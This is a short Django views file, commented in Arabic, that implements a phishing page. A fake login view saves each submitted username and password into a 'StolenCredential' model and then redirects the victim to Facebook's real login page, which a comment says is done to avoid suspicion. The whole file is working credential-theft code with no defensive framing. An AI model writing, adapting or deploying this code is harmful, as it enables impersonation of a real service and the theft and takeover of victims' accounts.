from django.shortcuts import render, redirect
from .models import StolenCredential
from django.views.decorators.csrf import csrf_exempt

# @csrf_exempt  # المهاجم غالبًا يعطله
def fake_login_view(request):
    if request.method == "POST":
        username = request.POST.get("username")
        password = request.POST.get("password")

        # حفظ البيانات في قاعدة البيانات
        StolenCredential.objects.create(username=username, password=password)

        # إعادة التوجيه لتجنب الشك
        return redirect("https://www.facebook.com/login.php")

    return render(request, "fake_login.html")
